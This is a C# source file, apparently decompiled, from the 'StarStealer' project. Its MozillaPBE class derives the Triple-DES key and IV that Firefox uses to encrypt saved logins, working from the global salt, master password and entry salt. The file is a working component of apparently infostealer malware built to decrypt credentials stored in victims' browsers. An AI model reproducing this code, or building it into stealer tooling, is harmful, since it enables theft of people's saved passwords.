using System;
using System.Security.Cryptography;

namespace StarStealer.Cryptography
{
	public class MozillaPBE
	{
		private byte[] GlobalSalt
		{
			get;
			set;
		}

		private byte[] MasterPassword
		{
			get;
			set;
		}

		private byte[] EntrySalt
		{
			get;
			set;
		}

		public byte[] Key
		{
			get;
			private set;
		}

		public byte[] IV
		{
			get;
			private set;
		}

		public MozillaPBE(byte[] GlobalSalt, byte[] MasterPassword, byte[] EntrySalt)
		{
			this.GlobalSalt = GlobalSalt;
			this.MasterPassword = MasterPassword;
			this.EntrySalt = EntrySalt;
		}

		public void Compute()
		{
			SHA1 sHA = new SHA1CryptoServiceProvider();
			byte[] array = new byte[GlobalSalt.Length + MasterPassword.Length];
			Array.Copy(GlobalSalt, 0, array, 0, GlobalSalt.Length);
			Array.Copy(MasterPassword, 0, array, GlobalSalt.Length, MasterPassword.Length);
			byte[] array2 = sHA.ComputeHash(array);
			byte[] array3 = new byte[array2.Length + EntrySalt.Length];
			Array.Copy(array2, 0, array3, 0, array2.Length);
			Array.Copy(EntrySalt, 0, array3, array2.Length, EntrySalt.Length);
			byte[] key = sHA.ComputeHash(array3);
			byte[] array4 = new byte[20];
			Array.Copy(EntrySalt, 0, array4, 0, EntrySalt.Length);
			for (int i = EntrySalt.Length; i < 20; i++)
			{
				array4[i] = 0;
			}
			byte[] array5 = new byte[array4.Length + EntrySalt.Length];
			Array.Copy(array4, 0, array5, 0, array4.Length);
			Array.Copy(EntrySalt, 0, array5, array4.Length, EntrySalt.Length);
			byte[] array6;
			byte[] array9;
			using (HMACSHA1 hMACSHA = new HMACSHA1(key))
			{
				array6 = hMACSHA.ComputeHash(array5);
				byte[] array7 = hMACSHA.ComputeHash(array4);
				byte[] array8 = new byte[array7.Length + EntrySalt.Length];
				Array.Copy(array7, 0, array8, 0, array7.Length);
				Array.Copy(EntrySalt, 0, array8, array7.Length, EntrySalt.Length);
				array9 = hMACSHA.ComputeHash(array8);
			}
			byte[] array10 = new byte[array6.Length + array9.Length];
			Array.Copy(array6, 0, array10, 0, array6.Length);
			Array.Copy(array9, 0, array10, array6.Length, array9.Length);
			Key = new byte[24];
			for (int j = 0; j < Key.Length; j++)
			{
				Key[j] = array10[j];
			}
			IV = new byte[8];
			int num = IV.Length - 1;
			for (int num2 = array10.Length - 1; num2 >= array10.Length - IV.Length; num2--)
			{
				IV[num] = array10[num2];
				num--;
			}
		}
	}
}
